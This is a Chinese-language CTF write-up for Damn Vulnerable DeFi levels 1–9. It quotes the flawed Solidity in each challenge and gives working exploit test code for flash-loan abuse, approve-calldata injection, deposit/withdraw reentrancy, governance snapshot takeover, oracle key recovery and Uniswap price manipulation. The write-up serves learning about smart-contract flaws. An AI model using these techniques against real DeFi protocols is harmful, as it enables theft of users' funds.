
## Play

Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)

# 解法紀錄

## 1	Unstoppable

- 目標

    讓所有人都不可以執行flashLoan(搞壞他)

- 問題程式
    UnstoppableLender.sol的flashLoan
    
    ```solidity=
    assert(poolBalance == balanceBefore);
    ```
    poolBalance來自於呼叫depositTokens function中才會增加
    
    balanceBefore則是當下合約的token數量
    

    所以只要不透過depositTokens
    
    直接把token打進去合約裡
    
    就不會改變poolBalance
    
    但是能改變balanceBefore
    
    即可以觸發assert

- 前端程式
    ```javascript=
     it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */
            await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        });
    ```


## 2	Naive receiver

- 目標

    receiver的token轉回pool

- 問題程式
    FlashLoanReceiver.sol的receiveEther
    ```solidity=
     uint256 amountToBeRepaid = msg.value + fee;

            require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");

            _executeActionDuringFlashLoan();

            // Return funds to pool
            pool.sendValue(amountToBeRepaid);
    ```
    最後會轉amountToBeRepaid回pool
    
    amountToBeRepaid=msg.value + fee;
    
    fee又等於1 ether (NaiveReceiverLenderPool.sol)

    receiver初始化只有10顆
    
    所以執行10次flashLoan之後
    
    全部的資金就沒了

- 前端程式

    ```javascript=
    it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */   
            for(var i=0;i<10;i++){
                await this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther('1'));
            }
        });
    ```
    
    理論上好像執行一次讓msg.value帶9顆也可以
    
    還沒嘗試

## 3	Truster

- 目標

    把Pool所有token轉到attacker

- 問題程式

    TrusterLenderPool.sol的flashLoan

    ```solidity=
     function flashLoan(
            uint256 borrowAmount,
            address borrower,
            address target,
            bytes calldata data
        )
            external
            nonReentrant
        {
            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

            damnValuableToken.transfer(borrower, borrowAmount);
            target.functionCall(data);

            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
    ```
    
    由於這裡沒有驗證任何東西
    
    所以只要把target填token合約
    
    並用data調用approve給attacker
    
    最後直接用transferFrom把錢領走即可


- 前端程式
    
    ```javascript=
        it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE  */
            await this.pool.connect(attacker).flashLoan(0,attacker.address,this.token.address, "0x095ea7b300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000d3c21bcecceda1000000");
            await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address, TOKENS_IN_POOL);
        });
    ```
    
    由於找不到ethers中怎麼搞出data
    
    這裡的data是由solidity生成
    ```solidity=
     abi.encodeWithSignature("approve(address,uint256)", 0x70997970C51812dc3A010C7d01b50e0d17dc79C8,1000000 ether); 
    ```
## 4	Side entrance
- 目標

    把Pool所有token轉到attacker

- 問題程式

    SideEntranceLenderPool.sol的flashLoan

    ```solidity=
    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");     
    ```
    最後驗證只看合約的balance
    
    但同時合約又提供了
    
    deposit()跟withdraw()

    於是可以透過flashLoan的execute執行自己合約時
    
    將flashLoan來的token 丟到deposit()
    
    這樣便可以通過flashLoan的驗證
    
    但是也存在新的deposit地址(我的合約)
    
    於是可以在合約中執行withdraw()
    
    把token提出來並且打給題目要求的attacker

- 合約程式

    [SideEntranceAttack.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/master/contracts/side-entrance/SideEntranceAttack.sol)

- 前端程式

    ```javascript=
        it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */      
            const test = await ethers.getContractFactory('SideEntranceLenderPool_test',attacker);
            const SideEntranceLenderPool_test = await test.deploy(this.pool.address);
            await SideEntranceLenderPool_test.connect(attacker).flashLoan();
        });
    ```

## 5	The rewarder

- 目標
    讓attacker分到最多token(?)

- 問題程式
    TheRewarderPool.sol的distributeRewards()
    ```solidity=
      if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                    rewardToken.mint(msg.sender, rewards);
                    lastRewardTimestamps[msg.sender] = block.timestamp;
                }
    ```
    對於驗證時間_hasRetrievedReward沒有判斷是不是deposit是不過了五天
    
    所以可以再過了五天後馬上deposit就取得token
    
    即可以跟上一題一樣flashloan借很多錢丟進去deposit
    
    然後去call distributeRewards()
    
    分到token再還flashloan
    
    轉出給attacker即可

- 合約程式

    [TheRewarderAttack.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/master/contracts/the-rewarder/TheRewarderAttack.sol)

- 前端程式

    ```javascript=
     it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */ 
            await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
            const t = await ethers.getContractFactory('Test', attacker);
            const test = await t.deploy(this.liquidityToken.address,this.rewarderPool.address,this.flashLoanPool.address,this.rewardToken.address);  
            await test.connect(attacker).flashLoan(ethers.utils.parseEther('1000000'));       
        });
    ```

## 6	The Selfie
- 目標

    讓attacker拿走SelfiePool裡全部token

- 問題程式

    SimpleGovernance.sol的SimpleGovernance

    ```solidity=
    function _hasEnoughVotes(address account) private view returns (bool) {
        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
    ```
    
    對於上次快照到當前沒有驗證需要經過多少時間
    
    所以可以flashloan借很多錢 然後快照
    
    就可以queueAction
    
    等時間超過了設定的2天
    
    就可以執行executeAction
    
    內容調用drainAllFunds把token都轉給attacker即可

- 合約程式

    [SelfieAttack.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/master/contracts/selfie/SelfieAttack.sol)

- 前端程式

    ```javascript=
    it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */
            const attack = await ethers.getContractFactory('SelfieAttack', attacker);
            this.attack = await attack.deploy(this.pool.address,this.governance.address,this.token.address);
            await this.attack.connect(attacker).flashLoan(TOKENS_IN_POOL);
            await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]);
            await this.governance.connect(attacker).executeAction(1);
        });
    ```



---

## 7 compromised

- 目標

    讓attacker拿走Exchange裡全部token

- 問題

    在題目中的兩段內文可以取得兩個私鑰

    這邊透過python解析

    ```python=
    import base64
    L = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
    print(base64.b64decode(bytes.fromhex("".join(L.split())).decode("utf-8")))
    ```
    
    得到`b'0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'`
    
    另一個得到`b'0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'`

    剛好是題目中三個Oracle中的兩個
    
    又因取得價格的方式是先排序
    
    如果Oracle不為二的倍數
    
    則取中間價格作為價格
    
    因題目為三

    所以只要控制了兩個Oracle 必定可以控制NFT價格
    
    最後就可以買超便宜的價格 賣他超貴
    
    把它嚕乾淨

- 前端程式

    ```javascript=
    it('Exploit', async function () {        
            /** CODE YOUR EXPLOIT HERE */
            let privateKey1="0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
            let wallet1 = await new ethers.Wallet(privateKey1,ethers.provider);
            let privateKey2="0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
            let wallet2 = await new ethers.Wallet(privateKey2,ethers.provider);
            await this.oracle.connect(wallet1).postPrice("DVNFT",ethers.utils.parseEther('0.001'));
            await this.oracle.connect(wallet2).postPrice("DVNFT",ethers.utils.parseEther('0.001'));
            await this.exchange.connect(attacker).buyOne( { value: ethers.utils.parseEther('0.01') });
            await this.oracle.connect(wallet1).postPrice("DVNFT",ethers.utils.parseEther('9990.001'));
            await this.oracle.connect(wallet2).postPrice("DVNFT",ethers.utils.parseEther('9990.001'));
            await this.nftToken.connect(attacker).approve(this.exchange.address,0);
            await this.exchange.connect(attacker).sellOne(0);
            await this.oracle.connect(wallet1).postPrice("DVNFT",INITIAL_NFT_PRICE);
            await this.oracle.connect(wallet2).postPrice("DVNFT",INITIAL_NFT_PRICE);

        });
    ```

---

## 8 Puppet



- 目標

    讓attacker拿走UNI Exchange裡全部token

- 問題

    UNI裡面的流動性少於attacker，又因公式是ETH/Token兩者數量去算出對應數字，

    一開始是1:1，但是透過對UNI Exchange的swap操作，可以控制兌換的比例

    這題會用到UNI swap v1
    
    這裡直接參考[官方文件](https://docs.uniswap.org/contracts/v1/reference/exchange)

    這裡使用UNI的tokenToEthSwapInput
    
    ![](https://i.imgur.com/f0wulSA.png)
    
    先嘗試把所有attacker的token兌換目標為1 wei ETH
    
    發現不符合題目要求最後attacker的要超過100000顆
    
    所以改成attacker手上的減一顆

- 前端程式
    ```javascript=
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        await this.uniswapExchange
        .connect(attacker)
        .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1,( await ethers.provider.getBlock("latest")).timestamp * 2);

        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ATTACKER_INITIAL_ETH_BALANCE });

    });
    ```
    
---

## 9 Puppet 2

- 目標

    讓attacker拿走UNI Exchange裡全部token

- 問題

    幾乎等於上一題程式

    只是改用了[UNI v2](https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02)當價格來源

    但是UNI v2一樣是透過兩種幣的數量控制兌換比例

    所以有足夠的抵押品就可以拿出全部的幣

    比較麻煩的問題是這次抵押品是wETH

    然後初始化並沒有給attacker wETH

    只有給token跟ETH

    所以透過UNI Swap把token兌換成wETH

    發現還是不夠

    接著把手上的ETH都換(deposit)成wETH之後就足夠了(扣掉gas所以少換0.1)

- 前端程式

    ```javascript=
     it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */
            await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
            await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
                    ATTACKER_INITIAL_TOKEN_BALANCE,                  
                    1,                                               
                    [this.token.address,  this.weth.address], 
                    attacker.address,                               
                    (await ethers.provider.getBlock("latest")).timestamp * 2                                      
            );

            await this.weth.connect(attacker).deposit({ value: ethers.utils.parseEther('19.9') });
            await this.weth.connect(attacker).approve(this.lendingPool.address, ATTACKER_INITIAL_TOKEN_BALANCE);
            await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
        });
    ```

